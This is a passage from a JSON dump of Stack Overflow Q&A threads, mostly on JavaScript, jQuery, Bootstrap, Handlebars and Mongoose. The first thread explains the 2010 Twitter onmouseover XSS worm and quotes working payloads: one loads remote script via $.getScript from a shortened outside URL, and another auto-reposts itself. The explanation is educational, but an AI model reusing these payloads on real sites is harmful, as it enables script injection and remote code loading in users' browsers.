                    "body": "<p>The exploit was a classic piece of Javascript injection. Suppose you write a tweet with the following text:</p>\n\n<pre><code>\"http://www.guardian.co.uk/technology is the best!\"\n</code></pre>\n\n<p>When you view the Twitter web page, that becomes a link, like so:</p>\n\n<pre><code>&lt;a href=\"http://www.guardian.co.uk/technology\" class=\"tweet-url web\" \n rel=\"nofollow\"&gt;http://www.guardian.co.uk/technology&lt;/a&gt; is the best!\n</code></pre>\n\n<p>The exploit attacked that link-making function. The raw text of the exploit tweet would read something like this:</p>\n\n<pre><code>http://a.no/@\";onmouseover=\";$('textarea:first').val(this.innerHTML);\n   $('.status-update-form').submit();\"class=\"modal-overlay\"/\n</code></pre>\n\n<p>Which Twitter didn't protect properly, probably because the @\" character combination broke their [HTML] parser. That link would generate the following page source:</p>\n\n<pre><code>&lt;a href=\"http://a.no/@\";onmouseover=\";$('textarea:first').val(this.innerHTML);\n $('.status-update-form').submit();\"class=\"modal-overlay\"/ class=\"tweet-url web\"\n      rel=\"nofollow\"&gt;\n</code></pre>\n\n<p>This means that executable content (the onMouseOver=\"stuff\" bit) has ended up in the page source code. Not knowing any better, the browser runs this code. Because it's running in the user's browser, it can do anything the user does; most variations used this power to re-post the content, which is why it spread like a virus. To encourage the user to activate the code by mousing over, they also formatted the block as black-on-black using CSS [Cascading Style Sheets, which determines the page layout]. Other versions were hacked around by users to have all sorts of other effects, such as porn site redirects, rainbow text in their tweets, and so forth. Some of them popped up dialog boxes designed to alarm the users, talking about accounts being disabled or passwords stolen (they weren't, in either case).</p>\n\n<p>Twitter fixed this not by blocking the string onMouseOver (which some dim-witted blogs were calling for) but by properly sanitising the input. The \" marks in these tweets are now turned into &quot; \u2013 the HTML-escaped form.</p>\n\n<p>Technically this is a second-order injection attack; the attack string is inserted into the database and handled correctly, but then the attack takes place as the string is read back out instead. It's not that complex an attack at all either - rather embarrassing for Twitter that they were caught out by this.</p>\n\n<p>Source: <a href=\"http://www.guardian.co.uk/technology/blog/2010/sep/21/twitter-hack-explained-xss-javascript\" rel=\"nofollow\">The Twitter hack: how it started and how it worked</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>Can you explain what exactly happened on Twitter today? Basically the exploit was causing people to post a tweet containing this link:  </p>\n\n<pre>http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\\u002f\\u002fis.gd\\u002ffl9A7')\"/</pre>\n\n<p>Is this technically an XSS attack or something else?</p>\n\n<p>Here is how the Twitter home page looked like: <a href=\"http://www.flickr.com/photos/travelist/6832853140/\">http://www.flickr.com/photos/travelist/6832853140/</a></p>\n",
            "last_activity_date": 1331641261,
            "question_id": 3762746,
            "score": 47,
            "tags": [
                "javascript",
                "jquery",
                "security",
                "twitter",
                "xss"
            ],
            "title": "Today&#39;s XSS onmouseover exploit on twitter.com"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>AFAIK it is not possible. But if you are interested in how extensions in firefox interact with the error console. <a href=\"https://developer.mozilla.org/en/Components.utils.reportError\" rel=\"nofollow\">Check this out.</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I would just install Firebug and use <code>console.log</code>. If you can't do that, though, you can always throw an error:</p>\n\n<pre><code>throw \"foobar\";\nthrow new Error(\"bazquux\");\n</code></pre>\n\n<p><strong>edit</strong>: Of course, this will break you out of the code that you're currently executing, so you can't use it for detailed logging, but if you can work around that I think it's the only way to get something logged out of the box.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>You cannot write to the console directly from untrusted JavaScript (e.g. scripts coming from a page).  However, even if installing Firebug does not appeal to you, I'd recommend checking out <a href=\"http://getfirebug.com/lite.html\">Firebug Lite</a>, which requires no installation into the browser (nor, in fact, does it even require Firefox).  It's a script which you can include into any web page (even dynamically), which will give you some basic Firebug functionality (such as <code>console.log()</code>).</p>\n",
                    "is_accepted": true,
                    "score": 29
                },
                {
                    "body": "<p>If you're interested, check out a script I wrote -- it's a \"cheap\" Firebug replacement that doesn't interfere with any normal console (like Safari or Chrome) but does extend it with almost all the Firebug methods:</p>\n\n<p><a href=\"http://code.google.com/p/glentilities/\" rel=\"nofollow\">http://code.google.com/p/glentilities/</a></p>\n\n<p>Look under the hood and you'll see what I mean by \"cheap\". :-)</p>\n\n<p>Combine it with YUI or json.org's JSON serializers to sorta replicate console.dir. </p>\n\n<p>Firebug and Firebug Lite are definitely nicer GUIs, but I use my home-grown one all the time to retain logging safely even for production code -- <em>without</em> constant commenting &amp; un-commenting,</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>yes you can =P</p>\n\n<pre><code>function log(param){\n    setTimeout(function(){\n        throw new Error(\"Debug: \"+param)\n    },0)\n}\n\n//Simple Test:\nalert(1)\nlog('this is my msg to the error log -_-')\nalert(2)\nlog('I can do this forever, does not break')\nalert(3)\n</code></pre>\n\n<p><em>update to a real function</em></p>\n\n<p>This is a simple hack, just for fun</p>\n",
                    "is_accepted": false,
                    "score": 32
                },
                {
                    "body": "<p>If you define a global function that checks for the existence of window.console, you can use Firebug for tracing and still plays nice with other browsers and/or if you turn Firebug's console tracing off:</p>\n\n<pre><code>debug = function (log_txt) {\n    if (typeof window.console != 'undefined') {\n        console.log(log_txt);\n    }\n}\n\ndebug(\"foo!\");\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 44
                },
                {
                    "body": "<p>This function does not require any extension nor library. However it grants full privileges to the relevant website. No worries since you are the one developing it, right?</p>\n\n<pre><code>\n// Define mylog() function to log to Firefox' error console if such a\n// thing exists\nfunction defineMyLog()\n{\n    // Provide a useless but harmless fallback\n    mylog = function(msg) { };\n    // return; // disable in production\n\n    if (typeof(netscape) === \"undefined\") {\n        // alert(\"Logging implemented only for Firefox\");\n        return;\n    }\n    // The initial auth popup can be avoided by pre-setting some magic user_pref\n    //  ( \"capability.principal.codebase.p0.granted\", \"UniversalXPConnect\"), etc.\n    try {\n        netscape.security.PrivilegeManager.enablePrivilege('UniversalXPConnect');\n    } catch (e) { // User has denied privileges\n        // alert(e.name + \": \" + e.message);\n        return;\n    }\n    ffconsoleService = Components.classes[\"@mozilla.org/consoleservice;1\"]\n                                 .getService(Components.interfaces.nsIConsoleService);\n    mylog = function (msg)\n    {\n        netscape.security.PrivilegeManager.enablePrivilege('UniversalXPConnect');\n        ffconsoleService.logStringMessage(new Date().toLocaleTimeString() + \": \" + msg);\n    }\n    mylog(\"Firefox logging function has been defined\");\n\n    // window.open(\"javascript:\"); // this URL does not work anymore?\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>window.console is undefined in Firefox 4 beta 6 even if Firebug 1.6X.0b1 is enabled and open, probably because of privilege issues that others discuss.  However, Firefox 4 has a new Tools > Web Console, and if this is open you have a window.console object and untrusted JavaScript code on the page can use console.log().  The Web Console is in flux (see <a href=\"https://wiki.mozilla.org/Firefox/Projects/Console\">https://wiki.mozilla.org/Firefox/Projects/Console</a>), you may need to change settings named devtools.* in about:config , YMMV.</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>I had an issue today, and notice that the Console in Firebug has different tabs, and mine was in Depuration Information, and you must select the ALL option in order to see console.log work without trowing errors! Simple like this! ;^)</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is it possible to add messages to  the built-in error console of Firefox from JavaScript code running in web pages?</p>\n\n<p>I know that I there's Firebug, which provides a <code>console</code> object and its own error console, but I was looking for a quick fix earlier on and couldn't find anything.</p>\n\n<p>I guess it might not be possible at all, to prevent malicious web pages from spamming the log?</p>\n",
            "last_activity_date": 1407588735,
            "question_id": 783661,
            "score": 46,
            "tags": [
                "javascript",
                "firefox",
                "debugging"
            ],
            "title": "Log to Firefox Error Console from JavaScript"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>The first option gives you more flexibilty:</p>\n\n<pre><code>var $div = $(\"&lt;div&gt;\", {id: \"foo\", class: \"a\"});\n$div.click(function(){ /* ... */ });\n$(\"#box\").append($div);\n</code></pre>\n\n<p>And of course <code>.html('*')</code> overrides the content while <code>.append('*')</code> doesn't, but I guess, this wasn't your question.</p>\n\n<p>Another good practice is prefixing your jQuery variables with <code>$</code>:<br>\n<a href=\"http://stackoverflow.com/q/10204606/601179\">Is there any specific reason behind using $ with variable in jQuery</a></p>\n",
                    "is_accepted": true,
                    "score": 82
                },
                {
                    "body": "<p>I would recommend the first option, where you actually build elements using jQuery. the second approach simply sets the innerHTML property of the element to a string, which happens to be HTML, and is more error prone and less flexible.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If <code>#box</code> is empty, nothing, but if it's not these do very different things.  The former will add a <code>div</code> as the last child node of <code>#box</code>.  The latter completely replaces the contents of <code>#box</code> with a single empty <code>div</code>, text and all.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I personally think that it's more important for the code to be readable and editable than performant. Whichever one you find easier to look at and it should be the one you choose for above factors. \nYou can write it as:</p>\n\n<pre><code>$('#box').append(\n  $('&lt;div/&gt;')\n    .attr(\"id\", \"newDiv1\")\n    .addClass(\"newDiv purple bloated\")\n    .append(\"&lt;span/&gt;\")\n      .text(\"hello world\")\n);\n</code></pre>\n\n<p>And your first Method as:</p>\n\n<pre><code>// create an element with an object literal, defining properties\nvar $e = $(\"&lt;div&gt;\", {id: \"newDiv1\", name: 'test', class: \"aClass\"});\n$div.click(function(){ /* ... */ });\n// add the element to the body\n$(\"#box\").append($e);\n</code></pre>\n\n<p><strong>But as far as readability goes; <a href=\"http://api.jquery.com/jQuery/#jQuery2\">the jQuery approach is my favorite</a>. Follow this <a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/14-helpful-jquery-tricks-notes-and-best-practices/\">Helpful jQuery Tricks, Notes, and Best Practices</a></strong></p>\n",
                    "is_accepted": false,
                    "score": 16
                },
                {
                    "body": "<p>Much more expressive way,</p>\n\n<pre><code>jQuery('&lt;div/&gt;', {\n    id: 'foo',\n    name: 'mainDiv',\n    class: 'wrapper',\n    click: function() {\n      jQuery( this ).toggleClass( \"test\" );\n    } }).appendTo('#selector');\n</code></pre>\n\n<p>Reference: <a href=\"http://api.jquery.com/jQuery/#jQuery2\" rel=\"nofollow\">Docs</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>create new element div</p>\n\n<pre><code>var div = $(\"&lt;div&gt;&lt;/div&gt;\");\n//element in html append anchor\n$(div).append(\"&lt;a href='#'&gt;Example&lt;/a&gt;\");\n//text\nalert($(div).html());\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/tefakgy8/1/\" rel=\"nofollow\">http://jsfiddle.net/tefakgy8/1/</a></p>\n",
                    "is_accepted": false,
                    "score": -1
                }
            ],
            "body": "<p>I've got 2 ways I can create a <code>&lt;div&gt;</code> using <code>jQuery</code>.</p>\n\n<p>Either:</p>\n\n<pre><code>var div = $(\"&lt;div&gt;&lt;/div&gt;\");\n$(\"#box\").append(div);\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>$(\"#box\").append(\"&lt;div&gt;&lt;/div&gt;\");\n</code></pre>\n\n<p>What are the drawbacks of using second way other than re-usability?</p>\n",
            "last_activity_date": 1425800281,
            "question_id": 10619445,
            "score": 41,
            "tags": [
                "javascript",
                "jquery",
                "append",
                "createelement",
                "jquery-append"
            ],
            "title": "The prefered way of creating a new element with jQuery"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I have forked and updated your fiddle.</p>\n\n<p>just go to .show function, I have written also the comments.</p>\n\n<p><a href=\"http://jsfiddle.net/2Rnpz/\">http://jsfiddle.net/2Rnpz/</a></p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>Actually, <strong>you don't need to modify any code</strong>. Read the following statement closely from twitterbootstrap site</p>\n\n<blockquote>\n  <p>Just add data-toggle=\"collapse\" and a data-target to element to automatically assign control of a collapsible element. The data-target attribute accepts a css selector to apply the collapse to. Be sure to add the class collapse to the collapsible element. If you'd like it to default open, add the additional class in.</p>\n</blockquote>\n\n<p>So instead of using <code>data-parent='#idofAccordion'</code>, use <code>data-target='#idofCollapseItem'</code>.</p>\n\n<p>It should work perfectly.</p>\n\n<p>Here is the <a href=\"http://plnkr.co/edit/OxbVII?p=preview\">demo on plunker</a></p>\n",
                    "is_accepted": false,
                    "score": 141
                },
                {
                    "body": "<p>The technique for having only one accordion open at a time(that is collapse the rest), is placing both data-parent=\"#accordion\" data-target=\"#collapseOne\" so it looks like this</p>\n\n<pre><code>&lt;a class=\"accordion-toggle\" data-toggle=\"collapse\" href=\"#\"\n    data-parent=\"#accordion\" data-target=\"#collapseOne\"&gt;\n  Item #1\n&lt;/a&gt;\n</code></pre>\n\n<p>You can look at it in plunker: <a href=\"http://plnkr.co/edit/56iXtA?p=preview\" rel=\"nofollow\">http://plnkr.co/edit/56iXtA?p=preview</a></p>\n",
                    "is_accepted": false,
                    "score": -1
                }
            ],
            "body": "<p>I'm trying to modify the Bootstrap collapse plugin to allow me to specify whether clicking an accordion (to open) should automatically close the other items in the accordion (so more than one item in the accordion can be open at a time)</p>\n\n<p>I want to create a new data attribute on the accordion, something like <code>data-collapse-type=\"auto|manual\"</code></p>\n\n<p>The bootstrap jQuery plugins are a bit advanced for my skill level. The most relevant part of what I need to mess with seems to be on line 52, <code>actives.collapse('hide')</code>. I don't want that to happen if 'data-collapse-type=\"manual\"' is set (omitting the attribute or setting <code>auto</code> should keep the default behavior).</p>\n\n<p>I've created a <a href=\"http://jsfiddle.net/aksKD/\">jsfiddle where I've been experiementing</a>.</p>\n\n<p>Can anyone help get me on the right track with this?</p>\n",
            "last_activity_date": 1374345981,
            "question_id": 10019689,
            "score": 38,
            "tags": [
                "javascript",
                "jquery",
                "oop",
                "twitter-bootstrap"
            ],
            "title": "Modify Twitter Bootstrap collapse plugin to keep accordions open"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Try</p>\n\n<pre><code>&lt;option value=\"{{id}}\"&gt;{{title}} {{../externalValue}}&lt;/option&gt;\n</code></pre>\n\n<p>The <code>../</code> path segment references the parent template scope that should be what you want.</p>\n",
                    "is_accepted": true,
                    "score": 90
                }
            ],
            "body": "<p>I have a handlebars.js template, just like this:</p>\n\n<pre><code>{{externalValue}}\n\n&lt;select name=\"test\"&gt;\n    {{#each myCollection}}\n       &lt;option value=\"{{id}}\"&gt;{{title}} {{externalValue}}&lt;/option&gt;\n    {{/each}}\n&lt;/select&gt;\n</code></pre>\n\n<p>And this is the generated output:</p>\n\n<pre><code>myExternalValue\n\n&lt;select name=\"test\"&gt;\n       &lt;option value=\"1\"&gt;First element &lt;/option&gt;\n       &lt;option value=\"2\"&gt;Second element &lt;/option&gt;\n       &lt;option value=\"3\"&gt;Third element &lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>As expected, I can access the <code>id</code> and <code>title</code> fields of every element of <code>myCollection</code> to generate my select. And outside the select, my <code>externalValue</code> variable is correctly printed (\"myExternalValue\").</p>\n\n<p>Unfortunately, in options' texts, <code>externalValue</code> value is never printed out.</p>\n\n<p>My question is: how can I access a variable outside the scope of the handlebars.js each from within the loop? </p>\n\n<p>As always, thanks in advance.</p>\n",
            "last_activity_date": 1394277479,
            "question_id": 13645084,
            "score": 37,
            "tags": [
                "javascript",
                "templates",
                "scope",
                "each",
                "handlebars.js"
            ],
            "title": "Access a variable outside the scope of a Handlebars.js each loop"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>There are several ways to go about this, it depends what your purpose is, if you just want to execute the function as well and in the same context, you can use <a href=\"https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/Apply\"><code>.apply()</code></a>:</p>\n\n<pre><code>function init(){\n  doSomething();\n}\nfunction myFunc(){\n  init.apply(this, arguments);\n  doSomethingHereToo();\n}\n</code></pre>\n\n<p>If you want to replace it with a newer <code>init</code>, it'd look like this:</p>\n\n<pre><code>function init(){\n  doSomething();\n}\n//anytime later\nvar old_init = init;\ninit = function() {\n  old_init.apply(this, arguments);\n  doSomethingHereToo();\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 36
                },
                {
                    "body": "<p>With a wider view of what you're actually trying to do and the context in which you're doing it, I'm sure we could give you a better answer than the <em>literal</em> answer to your question.</p>\n\n<p>But here's a literal answer:</p>\n\n<p>If you're assigning these functions to some property somewhere, you can wrap the original function and put your replacement on the property instead:</p>\n\n<pre><code>// Original code in main.js\nvar theProperty = init;\n\nfunction init(){\n     doSomething();\n}\n\n// Extending it by replacing and wrapping, in extended.js\ntheProperty = (function(old) {\n    function extendsInit() {\n        old();\n        doSomething();\n    }\n\n    return extendsInit;\n})(theProperty);\n</code></pre>\n\n<p>If your functions aren't already on an object, you'd probably want to put them there to facilitate the above. For instance:</p>\n\n<pre><code>// In main.js\nvar MyLibrary = (function() {\n    var publicSymbols = {};\n\n    publicSymbols.init = init;\n    function init() {\n    }\n\n    return publicSymbols;\n})();\n\n// In extended.js\n(function() {\n    var oldInit = MyLibrary.init;\n    MyLibrary.init = extendedInit;\n    function extendedInit() {\n        oldInit.apply(MyLibrary); // Use #apply in case `init` uses `this`\n        doSomething();\n    }\n})();\n</code></pre>\n\n<p>But there are <strong>such</strong> better ways to do that. Like for instance, providing a means of registering <code>init</code> functions.</p>\n\n<pre><code>// In main.js\nvar MyLibrary = (function() {\n    var publicSymbols = {},\n        initfunctions = [];\n\n    publicSymbols.init = init;\n    function init() {\n        var funcs = initFunctions;\n\n        initFunctions = undefined;\n\n        for (index = 0; index &lt; funcs.length; ++index) {\n            try { funcs[index](); } catch (e) { }\n        }\n    }\n\n    publicSymbols.addInitFunction = addInitFunction;\n    function addInitFunction(f) {\n        if (initFunctions) {\n            // Init hasn't run yet, rememeber it\n            initFunctions.push(f);\n        }\n        else {\n            // `init` has already run, call it almost immediately\n            // but *asynchronously* (so the caller never sees the\n            // call synchronously)\n            setTimeout(f, 0);\n        }\n    }\n\n    return publicSymbols;\n})();\n</code></pre>\n\n<p><em>(Much of the above could be written a bit more compactly, but I wanted to use clear names like <code>publicSymbols</code> rather than my usual <code>pubs</code> or anonymous object literal. You can write it a lot more compactly if you want to have anonymous functions, but <a href=\"http://blog.niftysnippets.org/2010/03/anonymouses-anonymous.html\">I don't much care for anonymous functions</a>.)</em></p>\n",
                    "is_accepted": true,
                    "score": 52
                },
                {
                    "body": "<p>The other methods are great but they don't preserve any prototype functions attached to init. To get around that you can do the following (inspired by the post from Nick Craver).</p>\n\n<pre><code>(function () {\n    var old_prototype = init.prototype;\n    var old_init = init;\n    init = function () {\n        old_init.apply(this, arguments);\n        // Do something extra\n    };\n    init.prototype = old_prototype;\n}) ();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<h2>Use <a href=\"https://github.com/devinrhode2/extendFunction.js\" rel=\"nofollow\">extendFunction.js</a></h2>\n\n<pre><code>init = extendFunction(init, function(args) {\n  doSomethingHereToo();\n});\n</code></pre>\n\n<p>But in your specific case, it's easier to extend the global onload function:</p>\n\n<pre><code>extendFunction('onload', function(args) {\n  doSomethingHereToo();\n});\n</code></pre>\n\n<p>I actually really like your question, it's making me think about different use cases.</p>\n\n<p>For javascript events, you really want to add and remove handlers - but for extendFunction, how could you later <em>remove</em> functionality? I could easily add a .revert method to extended functions, so <code>init = init.revert()</code> would return the original function. Obviously this could lead to some pretty bad code, but perhaps it lets you get something done without touching a foreign part of the codebase.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Another option could be:</p>\n\n<pre><code>var initial = function() {\n    console.log( 'initial function!' );\n}\n\nvar iWantToExecuteThisOneToo = function () {\n    console.log( 'the other function that i wanted to execute!' );\n}\n\nfunction extendFunction( oldOne, newOne ) {\n    return (function() {\n        oldOne();\n        newOne();\n    })();\n}\n\nvar extendedFunction = extendFunction( initial, iWantToExecuteThisOneToo );\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>The main reason why I want it is that I want to extend my initialize function.</p>\n\n<p>Something like this:</p>\n\n<pre><code>// main.js\n\nwindow.onload = init();\nfunction init(){\n     doSomething();\n}\n\n// extend.js\n\nfunction extends init(){\n    doSomethingHereToo();\n}\n</code></pre>\n\n<p>So I want to extend a function like I extend a class in PHP.</p>\n\n<p>And I would like to extend it from other files too, so for example I have the original init function in <code>main.js</code> and the extended function in <code>extended.js</code>.</p>\n",
            "last_activity_date": 1423236000,
            "question_id": 4578424,
            "score": 33,
            "tags": [
                "javascript",
                "function",
                "extend"
            ],
            "title": "Javascript: Extend a Function"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Interesting question. My immediate thought was to invert the color of the background as the text. This involves simply parsing the background and inverting its RGB value.</p>\n\n<p>Something like this: <a href=\"http://jsfiddle.net/2VTnZ/2/\" rel=\"nofollow\">http://jsfiddle.net/2VTnZ/2/</a></p>\n\n<pre><code>var rgb = $('#test').css('backgroundColor');\nvar colors = rgb.match(/^rgb\\((\\d+),\\s*(\\d+),\\s*(\\d+)\\)$/);\nvar brightness = 1;\n\nvar r = colors[1];\nvar g = colors[2];\nvar b = colors[3];\n\nvar ir = Math.floor((255-r)*brightness);\nvar ig = Math.floor((255-g)*brightness);\nvar ib = Math.floor((255-b)*brightness);\n\n$('#test').css('color', 'rgb('+ir+','+ig+','+ib+')');\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Interesting resources for this:</p>\n\n<ul>\n<li><a href=\"http://www.w3.org/TR/AERT#color-contrast\">W3C</a></li>\n<li><a href=\"http://www.nbdtech.com/Blog/archive/2008/04/27/Calculating-the-Perceived-Brightness-of-a-Color.aspx\">THIS</a></li>\n</ul>\n\n<p>Here's the W3C algorithm (with <a href=\"http://jsfiddle.net/PXJ2C/\">JSFiddle demo too</a>):</p>\n\n<p>JS:</p>\n\n<pre><code>var rgb = [255, 0, 0];\n\nsetInterval(function(){\n\n    var c = 'rgb('+rgb[0]+','+rgb[1]+','+rgb[2]+')';\n\n    var o = Math.round(((parseInt(rgb[0]) * 299) + (parseInt(rgb[1]) * 587) + (parseInt(rgb[2]) * 114)) /1000);\n\n    (o &gt; 125) ? $('#bg').css('color', 'black') : $('#bg').css('color', 'white'); //http://www.w3.org/TR/AERT#color-contrast\n\n    $('#bg').css('background-color', c);\n\n    rgb[0] = Math.round(Math.random() * 255);\n    rgb[1] = Math.round(Math.random() * 255);\n    rgb[2] = Math.round(Math.random() * 255);                \n\n\n}, 1000);\n</code></pre>\n\n<p>HTML:</p>\n\n<pre><code>&lt;div id=\"bg\"&gt;TEXT EXAMPLE&lt;/div&gt;\n</code></pre>\n\n<p>CSS:</p>\n\n<pre><code>#bg {\n     width: 200px;\n     height: 50px;    \n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 35
                },
                {
                    "body": "<p>This article on 24 ways about <a href=\"http://24ways.org/2010/calculating-color-contrast\">Calculating Color Contrast</a> might be of interest to you. Ignore the first set of functions because they're wrong, but the YIQ formula will help you determine whether or not to use a light or dark foreground color.</p>\n\n<p>Once you obtain the element's (or ancestor's) background color, you can use this function from the article to determine a suitable foreground color:</p>\n\n<pre><code>function getContrastYIQ(hexcolor){\n    var r = parseInt(hexcolor.substr(0,2),16);\n    var g = parseInt(hexcolor.substr(2,2),16);\n    var b = parseInt(hexcolor.substr(4,2),16);\n    var yiq = ((r*299)+(g*587)+(b*114))/1000;\n    return (yiq &gt;= 128) ? 'black' : 'white';\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>Here's my attempt:</p>\n\n<pre><code>(function ($) {\n    $.fn.contrastingText = function () {\n        var el = this,\n            transparent;\n        transparent = function (c) {\n            var m = c.match(/[0-9]+/g);\n            if (m !== null) {\n                return !!m[3];\n            }\n            else return false;\n        };\n        while (transparent(el.css('background-color'))) {\n            el = el.parent();\n        }\n        parts = el.css('background-color').match(/[0-9]+/g);\n        this.lightBackground = !!Math.round(\n            (\n                parseInt(parts[0], 10) + // red\n                parseInt(parts[1], 10) + // green\n                parseInt(parts[2], 10) // blue\n            ) / 765 // 255 * 3, so that we avg, then normalise to 1\n        );\n        if (this.lightBackground) {\n            this.css('color', 'black');\n        } else {\n            this.css('color', 'white');\n        }\n        return this;\n    };\n}(jQuery));\n</code></pre>\n\n<p>Then to use it:</p>\n\n<pre><code>var t = $('#my-el');\nt.contrastingText();\n</code></pre>\n\n<p>This will straight away, make the text either black or white as appropriate. To do the icons:</p>\n\n<pre><code>if (t.lightBackground) {\n    iconSuffix = 'black';\n} else {\n    iconSuffix = 'white';\n}\n</code></pre>\n\n<p>Then each icon could look like <code>'save' + iconSuffix + '.jpg'</code>.</p>\n\n<p>Note that this won't work where any container overflows its parent (for example, if the CSS height is 0, and overflow isn't hidden). To get that working would be a lot more complex.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I've thought about the following for a while already, so now I want to know your opinions, possible solutions, and so on.</p>\n\n<p>I am looking for a plugin or technique that changes a text's color or switches between predefined images/icons depending on the average brightness of the covered pixels of it's parent's background-image or -color.</p>\n\n<p>If the covered area of it's background is rather dark, make the text white or switch the icons. </p>\n\n<p>Additionally, it'd be great if the script would notice if the parent has no defined background-color or -image and then continue to search for the most nearest (from parent element to it's parent element..).</p>\n\n<p>What do you think, know about this idea? Is there something similar out there already? script-examples?</p>\n\n<p>Cheers, J.</p>\n",
            "last_activity_date": 1421531588,
            "question_id": 11867545,
            "score": 32,
            "tags": [
                "javascript",
                "jquery",
                "html5",
                "canvas",
                "background"
            ],
            "title": "Change text color based on brightness of the covered background area?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>It sounds like you're looking to try the new <a href=\"http://mongoosejs.com/docs/populate.html\">populate</a> functionality in Mongoose.</p>\n\n<p>Using your example above:</p>\n\n<pre><code>var Schema = mongoose.Schema,\n    ObjectId = Schema.ObjectId;\n\nSubdomainSchema = new Schema\n    name : String\n\nCustphoneSchema = new Schema\n    phone : String\n    subdomain  : { type: ObjectId, ref: 'SubdomainSchema' }\n</code></pre>\n\n<p>The <code>subdomain</code> field will be is updated with an '_id' such as:</p>\n\n<pre><code>var newSubdomain = new SubdomainSchema({name: 'Example Domain'})\nnewSubdomain.save()\n\nvar newCustphone = new CustphoneSchema({phone: '123-456-7890', subdomain: newSubdomain._id})\nnewCustphone.save()\n</code></pre>\n\n<p>To actually get data from the <code>subdomain</code> field you're going to have to use the slightly more complex query syntax:</p>\n\n<pre><code>CustphoneSchema.findOne({}).populate('subdomain').run(function(err, custPhone) { \n// Your callback code where you can access subdomain directly through custPhone.subdomain.name \n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 68
                },
                {
                    "body": "<p>I had a similar problem and had to use mongoose's Model.findByIdAndUpdate()</p>\n\n<p>docs: <a href=\"http://mongoosejs.com/docs/api.html#model_Model.findByIdAndUpdate\" rel=\"nofollow\">http://mongoosejs.com/docs/api.html#model_Model.findByIdAndUpdate</a></p>\n\n<p>this post helped me also: <a href=\"http://blog.ocliw.com/2012/11/25/mongoose-add-to-an-existing-array/comment-page-1/#comment-17812\" rel=\"nofollow\">http://blog.ocliw.com/2012/11/25/mongoose-add-to-an-existing-array/comment-page-1/#comment-17812</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have 2 Schemas, <code>Custphone</code> and <code>Subdomain</code>. <code>Custphone</code> <code>belongs_to</code> a <code>Subdomain</code> and <code>Subdomain</code> <code>has_many</code> <code>Custphones</code>.</p>\n\n<p>The problem is in creating the relationship using Mongoose. My goal is to do: custphone.subdomain and get the Subdomain that the Custphone belongs to.</p>\n\n<p>I have this in my schemas:</p>\n\n<pre><code>SubdomainSchema = new Schema\n    name : String\n\nCustphoneSchema = new Schema\n    phone : String\n    subdomain  : [SubdomainSchema]\n</code></pre>\n\n<p>When I print the Custphone result I get this:</p>\n\n<pre><code>{ _id: 4e9bc59b01c642bf4a00002d,\n  subdomain: [] }\n</code></pre>\n\n<p>When the <code>Custphone</code> result has <code>{\"$oid\": \"4e9b532b01c642bf4a000003\"}</code> in MongoDB.</p>\n\n<p><strong>I want to do <code>custphone.subdomain</code> and get the subdomain object of the custphone.</strong></p>\n",
            "last_activity_date": 1392630392,
            "question_id": 7810892,
            "score": 31,
            "tags": [
                "javascript",
                "mongodb",
                "node.js",
                "mongoose"
            ],
            "title": "Node.js - Creating Relationships with Mongoose"
        },
        {
            "answer_count": 6,
            "answers": [
                {
